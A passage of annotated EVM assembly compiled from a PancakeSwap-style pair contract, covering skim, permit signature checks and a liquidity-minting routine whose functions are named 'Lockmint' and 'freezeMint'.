0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_262:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_263\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_263:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18084  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_260:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:17989  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:18104  _safeTransfer(... */\n      jump\t// in\n    tag_259:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18223:18231  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18212:18216  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18114:18242  _safeTransfer(... */\n      tag_264\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18141:18148  _token1 */\n      dup5\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18162:18164  to */\n      dup8\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18232  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_260\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18223:18231  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18203  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18203  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18114:18242  _safeTransfer(... */\n    tag_264:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":672:694  address public factory */\n    tag_112:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":727:748  address public token1 */\n    tag_114:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_117:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3730:3745  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3726  deadline */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3745  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3710:3766  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_270\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_270:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3878:3894  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4121  nonces */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup3\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3912:4204  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3793:4228  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4352  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_272\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4376:4381  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4372  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_272:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4301:4433  require(... */\n      tag_273\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_273:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      tag_274\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4452:4457  owner */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4459:4466  spender */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4468:4473  value */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4451  _approve */\n      tag_183\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      jump\t// in\n    tag_274:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_120:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6452:6466  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_276\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_276:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6534  getReserves() */\n      tag_278\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6532  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6534  getReserves() */\n      jump\t// in\n    tag_278:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6608:6612  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6478:6534  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6559:6572  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6599  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_279\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_279:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_280\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_280:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_281:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6673:6677  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6624:6637  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6664  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_282\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_282:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_283\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_283:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_284\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_284:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6689:6701  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      tag_285\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6712  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6716  balance0.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_285:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6689:6727  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6737:6749  uint amount1 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      tag_286\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6760  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6764  balance1.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_286:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6737:6775  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6786:6796  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6829  _mintFee(_reserve0, _reserve1) */\n      tag_287\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6808:6817  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6819:6828  _reserve1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6807  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6829  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_287:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6839:6856  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6859:6870  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6786:6829  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6962:6979  _totalSupply == 0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n      tag_288\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7061  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_289\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7038  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      tag_208\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7024  amount0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7029:7036  amount1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7028  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7061  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_289:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6995:7061  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7116  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_292\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7094:7095  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7085  freezeMint */\n      tag_293\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7116  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_292:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n      jump(tag_294)\n    tag_288:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7214:7346  Math.min(... */\n      tag_295\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7277  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7247  amount0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7252:7264  _totalSupply */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7251  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7214:7346  Math.min(... */\n    tag_295:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7202:7346  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n    tag_294:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7386:7387  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7374:7383  liquidity */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7374:7387  liquidity > 0 */\n      gt\n        /* 